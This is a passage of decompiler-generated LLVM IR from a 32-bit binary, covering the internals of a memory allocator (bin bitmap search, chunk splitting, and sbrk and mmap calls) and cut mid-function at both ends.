  %v2_804a691 = inttoptr i32 %v1_804a691 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a691, align 4
  %v0_804a698 = load i32, i32* @edx, align 4
  %v1_804a698 = add i32 %v0_804a698, 12
  %v2_804a698 = inttoptr i32 %v1_804a698 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a698, align 4
  %v0_804a69f = load i32, i32* %eax.global-to-local, align 4
  %v1_804a69f = load i32, i32* @edx, align 4
  %v2_804a69f = add i32 %v1_804a69f, 4
  %v3_804a69f = inttoptr i32 %v2_804a69f to i32*
  store i32 %v0_804a69f, i32* %v3_804a69f, align 4
  %v0_804a6a2 = load i32, i32* %esi.global-to-local, align 4
  %v1_804a6a2 = load i32, i32* @edx, align 4
  %v3_804a6a2 = add i32 %v1_804a6a2, %v0_804a6a2
  %v4_804a6a2 = inttoptr i32 %v3_804a6a2 to i32*
  store i32 %v0_804a6a2, i32* %v4_804a6a2, align 4
  br label %dec_label_pc_804aba4

dec_label_pc_804a6ac:                             ; preds = %dec_label_pc_804a640, %dec_label_pc_804a630
  %v4_804a657 = phi i32 [ %storemerge1.pre, %dec_label_pc_804a630 ], [ %v3_804a643, %dec_label_pc_804a640 ]
  store i32 %v4_804a657, i32* %eax.global-to-local, align 4
  %v12_804a6ac = icmp eq i32 %v4_804a657, %v2_804a634
  %v1_804a6ae = icmp eq i1 %v12_804a6ac, false
  br i1 %v1_804a6ae, label %dec_label_pc_804a640, label %dec_label_pc_804a6b0.loopexit

dec_label_pc_804a6b0.loopexit:                    ; preds = %dec_label_pc_804a6ac
  br label %dec_label_pc_804a6b0

dec_label_pc_804a6b0:                             ; preds = %dec_label_pc_804a6b0.loopexit, %dec_label_pc_804a622
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804a6b9 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_804a6b9, i32* %ecx.global-to-local, align 4
  %v2_804a6bc = udiv i32 %v1_804a6b9, 32
  store i32 %v2_804a6bc, i32* @edi, align 4
  %v1_804a6bf = mul nuw nsw i32 %v2_804a6bc, 4
  %v2_804a6bf = add i32 %v1_804a6bf, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a6bf = inttoptr i32 %v2_804a6bf to i32*
  %v4_804a6bf = load i32, i32* %v3_804a6bf, align 4
  store i32 %v4_804a6bf, i32* %edx.global-to-local, align 4
  %v1_804a6c6 = mul i32 %v1_804a6b9, 8
  %v2_804a6c6 = add i32 %v1_804a6c6, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a6c6, i32* %ebx.global-to-local, align 4
  %v1_804a6cd = urem i32 %v1_804a6b9, 32
  %v2_804a6cd = icmp eq i32 %v1_804a6cd, 0
  store i32 %v1_804a6cd, i32* %ecx.global-to-local, align 4
  br i1 %v2_804a6cd, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_804a6b0
  %v5_804a6d0 = shl i32 1, %v1_804a6cd
  store i32 %v5_804a6d0, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804a6b0, %bb83, %dec_label_pc_804a711
  %v1_804a6d2 = phi i32 [ %v1_804a6d2.pre, %dec_label_pc_804a711 ], [ %v4_804a6bf, %bb83 ], [ %v4_804a6bf, %dec_label_pc_804a6b0 ]
  %v0_804a6d6 = phi i32 [ %v0_804a6d2.pre, %dec_label_pc_804a711 ], [ %v5_804a6d0, %bb83 ], [ 1, %dec_label_pc_804a6b0 ]
  %tmp84 = icmp ule i32 %v0_804a6d6, %v1_804a6d2
  %v1_804a6d6 = icmp eq i32 %v0_804a6d6, 0
  %v1_804a6d8 = icmp eq i1 %v1_804a6d6, false
  %or.cond = and i1 %tmp84, %v1_804a6d8
  br i1 %or.cond, label %dec_label_pc_804a6d6.dec_label_pc_804a706.preheader_crit_edge, label %dec_label_pc_804a6da.preheader

dec_label_pc_804a6d6.dec_label_pc_804a706.preheader_crit_edge: ; preds = %.preheader
  %v0_804a70112.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a706.preheader

dec_label_pc_804a6da.preheader:                   ; preds = %.preheader
  %v0_804a6da.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804a6da

dec_label_pc_804a6da:                             ; preds = %dec_label_pc_804a6da.preheader, %dec_label_pc_804a6e4
  %v0_804a6da = phi i32 [ %v0_804a6da.pre, %dec_label_pc_804a6da.preheader ], [ %v1_804a6da, %dec_label_pc_804a6e4 ]
  %v1_804a6da = add i32 %v0_804a6da, 1
  store i32 %v1_804a6da, i32* @edi, align 4
  %v6_804a6de = icmp ugt i32 %v1_804a6da, 2
  br i1 %v6_804a6de, label %dec_label_pc_804a795.loopexit, label %dec_label_pc_804a6e4

dec_label_pc_804a6e4:                             ; preds = %dec_label_pc_804a6da
  %v1_804a6e4 = mul i32 %v1_804a6da, 4
  %v2_804a6e4 = add i32 %v1_804a6e4, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a6e4 = inttoptr i32 %v2_804a6e4 to i32*
  %v4_804a6e4 = load i32, i32* %v3_804a6e4, align 4
  store i32 %v4_804a6e4, i32* %edx.global-to-local, align 4
  %v1_804a6eb = icmp eq i32 %v4_804a6e4, 0
  br i1 %v1_804a6eb, label %dec_label_pc_804a6da, label %dec_label_pc_804a6ef

dec_label_pc_804a6ef:                             ; preds = %dec_label_pc_804a6e4
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804a6f6 = mul i32 %v1_804a6da, 256
  store i32 %v2_804a6f6, i32* %eax.global-to-local, align 4
  %v1_804a6f9 = add i32 %v2_804a6f6, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v1_804a6f9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a706.preheader

dec_label_pc_804a706.preheader:                   ; preds = %dec_label_pc_804a6d6.dec_label_pc_804a706.preheader_crit_edge, %dec_label_pc_804a6ef
  %v0_804a70112 = phi i32 [ %v1_804a6f9, %dec_label_pc_804a6ef ], [ %v0_804a70112.pre, %dec_label_pc_804a6d6.dec_label_pc_804a706.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804a6ef ], [ %v0_804a6d6, %dec_label_pc_804a6d6.dec_label_pc_804a706.preheader_crit_edge ]
  %v0_804a717 = phi i32 [ %v4_804a6e4, %dec_label_pc_804a6ef ], [ %v1_804a6d2, %dec_label_pc_804a6d6.dec_label_pc_804a706.preheader_crit_edge ]
  %v2_804a7064 = and i32 %v0_804a717, %esi.promoted
  %v3_804a7065 = icmp eq i32 %v2_804a7064, 0
  br i1 %v3_804a7065, label %dec_label_pc_804a701, label %dec_label_pc_804a70a

dec_label_pc_804a701:                             ; preds = %dec_label_pc_804a706.preheader, %dec_label_pc_804a701
  %v2_804a70414 = phi i32 [ %v2_804a704, %dec_label_pc_804a701 ], [ %esi.promoted, %dec_label_pc_804a706.preheader ]
  %v0_804a70113 = phi i32 [ %v1_804a701, %dec_label_pc_804a701 ], [ %v0_804a70112, %dec_label_pc_804a706.preheader ]
  %v1_804a701 = add i32 %v0_804a70113, 8
  %v2_804a704 = mul i32 %v2_804a70414, 2
  %v2_804a706 = and i32 %v2_804a704, %v0_804a717
  %v3_804a706 = icmp eq i32 %v2_804a706, 0
  br i1 %v3_804a706, label %dec_label_pc_804a701, label %dec_label_pc_804a706.dec_label_pc_804a70a_crit_edge

dec_label_pc_804a706.dec_label_pc_804a70a_crit_edge: ; preds = %dec_label_pc_804a701
  store i32 %v1_804a701, i32* %ebx.global-to-local, align 4
  store i32 %v2_804a704, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a70a

dec_label_pc_804a70a:                             ; preds = %dec_label_pc_804a706.dec_label_pc_804a70a_crit_edge, %dec_label_pc_804a706.preheader
  %v0_804a711 = phi i32 [ %v2_804a704, %dec_label_pc_804a706.dec_label_pc_804a70a_crit_edge ], [ %esi.promoted, %dec_label_pc_804a706.preheader ]
  %v1_804a734 = phi i32 [ %v1_804a701, %dec_label_pc_804a706.dec_label_pc_804a70a_crit_edge ], [ %v0_804a70112, %dec_label_pc_804a706.preheader ]
  %v1_804a70a = add i32 %v1_804a734, 12
  %v2_804a70a = inttoptr i32 %v1_804a70a to i32*
  %v3_804a70a = load i32, i32* %v2_804a70a, align 4
  store i32 %v3_804a70a, i32* @ecx, align 4
  %v12_804a70d = icmp eq i32 %v3_804a70a, %v1_804a734
  %v1_804a70f = icmp eq i1 %v12_804a70d, false
  br i1 %v1_804a70f, label %dec_label_pc_804a725, label %dec_label_pc_804a711

dec_label_pc_804a711:                             ; preds = %dec_label_pc_804a70a
  %v2_804a713 = mul i32 %v0_804a711, 2
  store i32 %v2_804a713, i32* %esi.global-to-local, align 4
  %v1_804a715 = sub i32 -1, %v0_804a711
  store i32 %v1_804a715, i32* %eax.global-to-local, align 4
  %v2_804a717 = and i32 %v0_804a717, %v1_804a715
  store i32 %v2_804a717, i32* %edx.global-to-local, align 4
  %v1_804a719 = add i32 %v3_804a70a, 8
  store i32 %v1_804a719, i32* %ebx.global-to-local, align 4
  %v1_804a71c = load i32, i32* @edi, align 4
  %v2_804a71c = mul i32 %v1_804a71c, 4
  %v3_804a71c = add i32 %v2_804a71c, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v4_804a71c = inttoptr i32 %v3_804a71c to i32*
  store i32 %v2_804a717, i32* %v4_804a71c, align 4
  %v0_804a6d2.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804a6d2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804a725:                             ; preds = %dec_label_pc_804a70a
  %v1_804a725 = add i32 %v3_804a70a, 4
  %v2_804a725 = inttoptr i32 %v1_804a725 to i32*
  %v3_804a725 = load i32, i32* %v2_804a725, align 4
  store i32 %v3_804a725, i32* %edx.global-to-local, align 4
  %v1_804a728 = add i32 %v3_804a70a, 12
  %v2_804a728 = inttoptr i32 %v1_804a728 to i32*
  %v3_804a728 = load i32, i32* %v2_804a728, align 4
  store i32 %v3_804a728, i32* %eax.global-to-local, align 4
  %v1_804a72b = and i32 %v3_804a725, -4
  store i32 %v1_804a72b, i32* @edx, align 4
  %v5_804a730 = sub i32 %v1_804a72b, %v1_804a82a
  store i32 %v5_804a730, i32* %esi.global-to-local, align 4
  store i32 %v3_804a728, i32* %v2_804a70a, align 4
  %v0_804a737 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a737 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a737 = add i32 %v1_804a737, 8
  %v3_804a737 = inttoptr i32 %v2_804a737 to i32*
  store i32 %v0_804a737, i32* %v3_804a737, align 4
  %v0_804a73a = load i32, i32* %esi.global-to-local, align 4
  %tmp130 = icmp ult i32 %v0_804a73a, 16
  %v0_804a73f = load i32, i32* @ecx, align 4
  br i1 %tmp130, label %dec_label_pc_804a73f, label %dec_label_pc_804a746

dec_label_pc_804a73f:                             ; preds = %dec_label_pc_804a725
  %v1_804a73f = load i32, i32* @edx, align 4
  %v2_804a73f = add i32 %v0_804a73f, 4
  %v3_804a73f = add i32 %v2_804a73f, %v1_804a73f
  %v4_804a73f = inttoptr i32 %v3_804a73f to i32*
  %v5_804a73f = load i32, i32* %v4_804a73f, align 4
  %v6_804a73f = or i32 %v5_804a73f, 1
  store i32 %v6_804a73f, i32* %v4_804a73f, align 4
  br label %dec_label_pc_804a78d

dec_label_pc_804a746:                             ; preds = %dec_label_pc_804a725
  %v2_804a74a = add i32 %v0_804a73f, %v1_804a82a
  store i32 %v2_804a74a, i32* %eax.global-to-local, align 4
  %v1_804a753 = load i32, i32* @ebp, align 4
  %v2_804a753 = add i32 %v1_804a753, 8
  %v3_804a753 = inttoptr i32 %v2_804a753 to i32*
  store i32 %v2_804a74a, i32* %v3_804a753, align 4
  %v0_804a756 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a756 = load i32, i32* @ebp, align 4
  %v2_804a756 = add i32 %v1_804a756, 12
  %v3_804a756 = inttoptr i32 %v2_804a756 to i32*
  store i32 %v0_804a756, i32* %v3_804a756, align 4
  %v0_804a759 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a759 = add i32 %v0_804a759, 8
  %v2_804a759 = inttoptr i32 %v1_804a759 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a759, align 4
  %v0_804a760 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a760 = add i32 %v0_804a760, 12
  %v2_804a760 = inttoptr i32 %v1_804a760 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a760, align 4
  %v0_804a767 = load i32, i32* @global_var_8054630.39, align 16
  %v4_804a76d = load i32, i32* %eax.global-to-local, align 4
  %v5_804a76d = select i1 %v8_804a4d3, i32 %v4_804a76d, i32 %v0_804a767
  %v4_804a770 = or i32 %v1_804a82a, 1
  store i32 %v5_804a76d, i32* @global_var_8054630.39, align 16
  %v0_804a77b = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804a770, i32* %ebx.global-to-local, align 4
  %v1_804a781 = or i32 %v0_804a77b, 1
  store i32 %v1_804a781, i32* @edx, align 4
  %v3_804a784 = add i32 %v0_804a77b, %v4_804a76d
  %v4_804a784 = inttoptr i32 %v3_804a784 to i32*
  store i32 %v0_804a77b, i32* %v4_804a784, align 4
  %v0_804a787 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a787 = load i32, i32* @ecx, align 4
  %v2_804a787 = add i32 %v1_804a787, 4
  %v3_804a787 = inttoptr i32 %v2_804a787 to i32*
  store i32 %v0_804a787, i32* %v3_804a787, align 4
  %v0_804a78a = load i32, i32* @edx, align 4
  %v1_804a78a = load i32, i32* %eax.global-to-local, align 4
  %v2_804a78a = add i32 %v1_804a78a, 4
  %v3_804a78a = inttoptr i32 %v2_804a78a to i32*
  store i32 %v0_804a78a, i32* %v3_804a78a, align 4
  br label %dec_label_pc_804a78d

dec_label_pc_804a78d:                             ; preds = %dec_label_pc_804a881, %dec_label_pc_804a73f, %dec_label_pc_804a746
  %v0_804a78d = load i32, i32* @ecx, align 4
  %v1_804a78d = add i32 %v0_804a78d, 8
  store i32 %v1_804a78d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804abb5

dec_label_pc_804a795.loopexit:                    ; preds = %dec_label_pc_804a6da
  br label %dec_label_pc_804a795

dec_label_pc_804a795:                             ; preds = %dec_label_pc_804a795.loopexit, %dec_label_pc_804a495, %dec_label_pc_804a49d
  %v0_804a795 = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804a795, i32* @ebx, align 4
  store i32 %v1_804a82a, i32* %esi.global-to-local, align 4
  %v1_804a79f = add i32 %v0_804a795, 4
  %v2_804a79f = inttoptr i32 %v1_804a79f to i32*
  %v3_804a79f = load i32, i32* %v2_804a79f, align 4
  %v1_804a7a2 = add i32 %v1_804a82a, 16
  store i32 %v1_804a7a2, i32* @esi, align 4
  %v1_804a7a9 = and i32 %v3_804a79f, -4
  store i32 %v1_804a7a9, i32* %ecx.global-to-local, align 4
  %v7_804a7ac = icmp ult i32 %v1_804a7a9, %v1_804a7a2
  br i1 %v7_804a7ac, label %dec_label_pc_804a7cc, label %dec_label_pc_804a7b0

dec_label_pc_804a7b0:                             ; preds = %dec_label_pc_804a795
  %v2_804a7b4 = add i32 %v0_804a795, %v1_804a82a
  store i32 %v2_804a7b4, i32* @edx, align 4
  %v1_804a7b7 = or i32 %v1_804a82a, 1
  store i32 %v1_804a7b7, i32* %eax.global-to-local, align 4
  store i32 %v2_804a7b4, i32* @global_var_805462c.38, align 4
  store i32 %v1_804a7b7, i32* %v2_804a79f, align 4
  %v0_804a7c3 = load i32, i32* %ecx.global-to-local, align 4
  %v5_804a7c3 = sub i32 %v0_804a7c3, %v1_804a82a
  store i32 %v5_804a7c3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ab45

dec_label_pc_804a7cc:                             ; preds = %dec_label_pc_804a795
  %v0_804a7cc = load i8, i8* @global_var_8054600.37, align 512
  %v1_804a7cc = and i8 %v0_804a7cc, 2
  %v2_804a7cc = icmp eq i8 %v1_804a7cc, 0
  %v0_804a7d3 = load i32, i32* @global_var_805495c.43, align 4
  store i32 %v0_804a7d3, i32* %edx.global-to-local, align 4
  br i1 %v2_804a7cc, label %dec_label_pc_804a800, label %dec_label_pc_804a7db

dec_label_pc_804a7db:                             ; preds = %dec_label_pc_804a7cc
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a7e3 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @ebx, align 4
  %v1_804a7ed = add i32 %v1_804a82a, -7
  store i32 %v1_804a7ed, i32* %eax.global-to-local, align 4
  store i32 %v1_804a7ed, i32* %stack_var_-92, align 4
  %v1_804a7f1 = call i32 @malloc(i32 %v1_804a7ed)
  store i32 %v1_804a7f1, i32* %eax.global-to-local, align 4
  store i32 %v1_804a7f1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804abb5

dec_label_pc_804a800:                             ; preds = %dec_label_pc_804a7cc
  store i32 %v1_804a82a, i32* @ebx, align 4
  %v1_804a804 = add i32 %v0_804a7d3, -1
  store i32 %v1_804a804, i32* @ecx, align 4
  %v1_804a807 = load i32, i32* @global_var_805494c.44, align 4
  %v7_804a807 = icmp ult i32 %v1_804a82a, %v1_804a807
  br i1 %v7_804a807, label %dec_label_pc_804a8e2, label %dec_label_pc_804a817

dec_label_pc_804a817:                             ; preds = %dec_label_pc_804a800
  %v0_804a817 = load i32, i32* @global_var_8054950.45, align 16
  store i32 %v0_804a817, i32* %eax.global-to-local, align 4
  %v1_804a81c = load i32, i32* @global_var_8054954.46, align 4
  %v5_804a822 = icmp slt i32 %v0_804a817, %v1_804a81c
  br i1 %v5_804a822, label %dec_label_pc_804a828, label %dec_label_pc_804a8e2

dec_label_pc_804a828:                             ; preds = %dec_label_pc_804a817
  %v2_804a82a = add i32 %v1_804a82a, 10
  %v3_804a82a = add i32 %v2_804a82a, %v0_804a7d3
  %v1_804a82e = sub i32 0, %v0_804a7d3
  store i32 %v1_804a82e, i32* %eax.global-to-local, align 4
  %v2_804a830 = and i32 %v3_804a82a, %v1_804a82e
  store i32 %v2_804a830, i32* @ebx, align 4
  %tmp131 = icmp ugt i32 %v2_804a830, %v1_804a82a
  br i1 %tmp131, label %dec_label_pc_804a83c, label %dec_label_pc_804a8e2

dec_label_pc_804a83c:                             ; preds = %dec_label_pc_804a828
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804a849 = call i32 @mmap(i32 0, i32 %v2_804a830, i32 3, i32 34, i32 0, i32 0, i32 %v1_804a804, i32 %v1_804a804)
  store i32 %v8_804a849, i32* %eax.global-to-local, align 4
  %v10_804a851 = icmp eq i32 %v8_804a849, -1
  store i32 %v8_804a849, i32* %edx.global-to-local, align 4
  br i1 %v10_804a851, label %dec_label_pc_804a83c.dec_label_pc_804a8e2_crit_edge, label %dec_label_pc_804a85c

dec_label_pc_804a83c.dec_label_pc_804a8e2_crit_edge: ; preds = %dec_label_pc_804a83c
  %v0_804a8e2.pre = load i32, i32* @global_var_805462c.38, align 4
  br label %dec_label_pc_804a8e2

dec_label_pc_804a85c:                             ; preds = %dec_label_pc_804a83c
  %v1_804a85e = urem i32 %v8_804a849, 8
  %v2_804a85e = icmp eq i32 %v1_804a85e, 0
  store i32 %v1_804a85e, i32* %ecx.global-to-local, align 4
  br i1 %v2_804a85e, label %dec_label_pc_804a877, label %dec_label_pc_804a863

dec_label_pc_804a863:                             ; preds = %dec_label_pc_804a85c
  %v0_804a868 = load i32, i32* @ebx, align 4
  %v2_804a86a = sub nsw i32 8, %v1_804a85e
  store i32 %v2_804a86a, i32* %eax.global-to-local, align 4
  %v2_804a86c = add i32 %v2_804a86a, %v8_804a849
  store i32 %v2_804a86c, i32* @ecx, align 4
  %v2_804a86f = sub i32 %v0_804a868, %v2_804a86a
  store i32 %v2_804a86f, i32* %esi.global-to-local, align 4
  %v2_804a871 = inttoptr i32 %v2_804a86c to i32*
  store i32 %v2_804a86a, i32* %v2_804a871, align 4
  br label %dec_label_pc_804a881

dec_label_pc_804a877:                             ; preds = %dec_label_pc_804a85c
  store i32 %v8_804a849, i32* @ecx, align 4
  %v1_804a879 = inttoptr i32 %v8_804a849 to i32*
  store i32 0, i32* %v1_804a879, align 4
  br label %dec_label_pc_804a881

dec_label_pc_804a881:                             ; preds = %dec_label_pc_804a863, %dec_label_pc_804a877
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804a863 ], [ @ebx, %dec_label_pc_804a877 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804a881 = or i32 %storemerge, 2
  %v1_804a884 = load i32, i32* @ecx, align 4
  %v2_804a884 = add i32 %v1_804a884, 4
  %v3_804a884 = inttoptr i32 %v2_804a884 to i32*
  store i32 %v1_804a881, i32* %v3_804a884, align 4
  %v0_804a887 = load i32, i32* @global_var_8054950.45, align 16
  %v0_804a88c = load i32, i32* @global_var_8054970.47, align 16
  %v1_804a892 = add i32 %v0_804a887, 1
  %v1_804a893 = load i32, i32* @global_var_8054958.48, align 8
  %v2_804a893 = sub i32 %v1_804a892, %v1_804a893
  %v8_804a893 = xor i32 %v1_804a893, %v1_804a892
  %v9_804a893 = xor i32 %v2_804a893, %v1_804a892
  %v10_804a893 = and i32 %v9_804a893, %v8_804a893
  %v11_804a893 = icmp slt i32 %v10_804a893, 0
  %v12_804a893 = icmp eq i32 %v2_804a893, 0
  %v13_804a893 = icmp slt i32 %v2_804a893, 0
  store i32 %v1_804a892, i32* @global_var_8054950.45, align 16
  %v3_804a89e = icmp ne i1 %v13_804a893, %v11_804a893
  %v4_804a89e = or i1 %v12_804a893, %v3_804a89e
  %v7_804a89e = select i1 %v4_804a89e, i32 %v1_804a893, i32 %v1_804a892
  store i32 %v7_804a89e, i32* @global_var_8054958.48, align 8
  %v0_804a8aa = load i32, i32* @global_var_8054964.49, align 4
  %v1_804a8af = load i32, i32* @ebx, align 4
  %v2_804a8af = add i32 %v1_804a8af, %v0_804a8aa
  store i32 %v2_804a8af, i32* @global_var_8054964.49, align 4
  %tmp86 = icmp ule i32 %v2_804a8af, %v0_804a88c
  %v5_804a8bc = select i1 %tmp86, i32 %v0_804a88c, i32 %v2_804a8af
  store i32 %v5_804a8bc, i32* @edx, align 4
  %v1_804a8bf = load i32, i32* @global_var_8054968.50, align 8
  %v2_804a8bf = add i32 %v1_804a8bf, %v2_804a8af
  store i32 %v5_804a8bc, i32* @global_var_8054970.47, align 16
  %v1_804a8cb = load i32, i32* @global_var_8054974.51, align 4
  %tmp132 = icmp ule i32 %v2_804a8bf, %v1_804a8cb
  %v5_804a8d1 = select i1 %tmp132, i32 %v1_804a8cb, i32 %v2_804a8bf
  store i32 %v5_804a8d1, i32* %eax.global-to-local, align 4
  store i32 %v5_804a8d1, i32* @global_var_8054974.51, align 4
  br label %dec_label_pc_804a78d

dec_label_pc_804a8e2:                             ; preds = %dec_label_pc_804a828, %dec_label_pc_804a83c.dec_label_pc_804a8e2_crit_edge, %dec_label_pc_804a817, %dec_label_pc_804a800
  %v0_804a8e2 = phi i32 [ %v0_804a8e2.pre, %dec_label_pc_804a83c.dec_label_pc_804a8e2_crit_edge ], [ %v0_804a795, %dec_label_pc_804a817 ], [ %v0_804a795, %dec_label_pc_804a828 ], [ %v0_804a795, %dec_label_pc_804a800 ]
  store i32 %v0_804a8e2, i32* %eax.global-to-local, align 4
  %v1_804a8eb = add i32 %v0_804a8e2, 4
  %v2_804a8eb = inttoptr i32 %v1_804a8eb to i32*
  %v3_804a8eb = load i32, i32* %v2_804a8eb, align 4
  %v1_804a8f2 = and i32 %v3_804a8eb, -4
  %v2_804a8f2 = icmp eq i32 %v1_804a8f2, 0
  store i32 %v1_804a8f2, i32* @ebp, align 4
  %v1_804a8f8 = load i32, i32* @global_var_8054948.52, align 8
  %v0_804a902 = load i8, i8* @global_var_8054960.53, align 32
  %v1_804a902 = urem i8 %v0_804a902, 2
  %v2_804a902 = icmp eq i8 %v1_804a902, 0
  %v1_804a909 = icmp eq i1 %v2_804a902, false
  %v1_804a8f2.op = sub i32 0, %v1_804a8f2
  %v2_804a900.neg = select i1 %v1_804a909, i32 %v1_804a8f2.op, i32 0
  %v2_804a8f8 = add i32 %v1_804a804, %v1_804a7a2
  %v4_804a909 = add i32 %v2_804a8f8, %v1_804a8f8
  %v5_804a910 = add i32 %v4_804a909, %v2_804a900.neg
  store i32 %v5_804a910, i32* %eax.global-to-local, align 4
  %v1_804a914 = sub i32 0, %v0_804a7d3
  store i32 %v1_804a914, i32* @edx, align 4
  %v2_804a918 = and i32 %v5_804a910, %v1_804a914
  store i32 %v2_804a918, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_804a918, 1
  br i1 %tmp87, label %dec_label_pc_804a936, label %dec_label_pc_804a920

dec_label_pc_804a920:                             ; preds = %dec_label_pc_804a8e2
  store i32 %v2_804a918, i32* %stack_var_-92, align 4
  %v1_804a924 = call i32 @__GI_sbrk(i32 %v2_804a918)
  store i32 %v1_804a924, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_804a92f = icmp eq i32 %v1_804a924, -1
  store i32 %v1_804a924, i32* @ebx, align 4
  %v1_804a934 = icmp eq i1 %v10_804a92f, false
  br i1 %v1_804a934, label %dec_label_pc_804a98d, label %dec_label_pc_804a920.dec_label_pc_804a936_crit_edge

dec_label_pc_804a920.dec_label_pc_804a936_crit_edge: ; preds = %dec_label_pc_804a920
  %v0_804a936.pre = load i8, i8* @global_var_8054960.53, align 32
  br label %dec_label_pc_804a936

dec_label_pc_804a936:                             ; preds = %dec_label_pc_804a920.dec_label_pc_804a936_crit_edge, %dec_label_pc_804a8e2
  %v0_804a963 = phi i32 [ -1, %dec_label_pc_804a920.dec_label_pc_804a936_crit_edge ], [ %v1_804a914, %dec_label_pc_804a8e2 ]
  %v0_804a936 = phi i8 [ %v0_804a936.pre, %dec_label_pc_804a920.dec_label_pc_804a936_crit_edge ], [ %v0_804a902, %dec_label_pc_804a8e2 ]
  %v1_804a936 = urem i8 %v0_804a936, 2
  %v2_804a936 = icmp eq i8 %v1_804a936, 0
  br i1 %v2_804a936, label %dec_label_pc_804a936.dec_label_pc_804a94b_crit_edge, label %dec_label_pc_804a93f

dec_label_pc_804a936.dec_label_pc_804a94b_crit_edge: ; preds = %dec_label_pc_804a936
  %v0_804a94b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a94b

dec_label_pc_804a93f:                             ; preds = %dec_label_pc_804a936
  %v2_804a943 = add i32 %v1_804a8f2, %v1_804a804
  store i32 %v2_804a943, i32* %eax.global-to-local, align 4
  %v0_804a945 = load i32, i32* @esi, align 4
  %v2_804a945 = add i32 %v0_804a945, %v2_804a943
  %v5_804a947 = and i32 %v2_804a945, %v1_804a914
  store i32 %v5_804a947, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a94b

dec_label_pc_804a94b:                             ; preds = %dec_label_pc_804a936.dec_label_pc_804a94b_crit_edge, %dec_label_pc_804a93f
  %v3_804a956 = phi i32 [ %v0_804a94b.pre, %dec_label_pc_804a936.dec_label_pc_804a94b_crit_edge ], [ %v5_804a947, %dec_label_pc_804a93f ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_804a956, 1048576
  %v5_804a956 = select i1 %tmp88, i32 1048576, i32 %v3_804a956
  store i32 %v5_804a956, i32* @esi, align 4
  %tmp133 = icmp ugt i32 %v5_804a956, %v1_804a82a
  br i1 %tmp133, label %dec_label_pc_804a963, label %dec_label_pc_804aba8

dec_label_pc_804a963:                             ; preds = %dec_label_pc_804a94b
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804a970 = call i32 @mmap(i32 0, i32 %v5_804a956, i32 3, i32 34, i32 0, i32 0, i32 %v0_804a963, i32 %v0_804a963)
  store i32 %v8_804a970, i32* %eax.global-to-local, align 4
  %v10_804a978 = icmp eq i32 %v8_804a970, -1
  store i32 %v8_804a970, i32* @ebx, align 4
  br i1 %v10_804a978, label %dec_label_pc_804aba8, label %dec_label_pc_804a983

dec_label_pc_804a983:                             ; preds = %dec_label_pc_804a963
  %v0_804a983 = load i8, i8* @global_var_8054960.53, align 1
  %v2_804a983 = and i8 %v0_804a983, -2
  store i8 %v2_804a983, i8* @global_var_8054960.53, align 32
  %v1_804a98a = load i32, i32* @esi, align 4
  %v2_804a98a = add i32 %v1_804a98a, %v8_804a970
  store i32 %v2_804a98a, i32* @edx, align 4
  br label %dec_label_pc_804a98d

dec_label_pc_804a98d:                             ; preds = %dec_label_pc_804a920, %dec_label_pc_804a983
  %v0_804aa54 = phi i32 [ -1, %dec_label_pc_804a920 ], [ %v2_804a98a, %dec_label_pc_804a983 ]
  %v0_804aa62 = phi i32 [ %v1_804a924, %dec_label_pc_804a920 ], [ %v8_804a970, %dec_label_pc_804a983 ]
  %v10_804a98d = icmp eq i32 %v0_804aa62, -1
  br i1 %v10_804a98d, label %dec_label_pc_804aba8, label %dec_label_pc_804a996

dec_label_pc_804a996:                             ; preds = %dec_label_pc_804a98d
  %v0_804a99a = load i32, i32* @global_var_8054968.50, align 8
  %v1_804a99a = load i32, i32* @esi, align 4
  %v2_804a99a = add i32 %v1_804a99a, %v0_804a99a
  store i32 %v2_804a99a, i32* @global_var_8054968.50, align 8
  %v2_804a9a0 = add i32 %v1_804a8f2, %v0_804a8e2
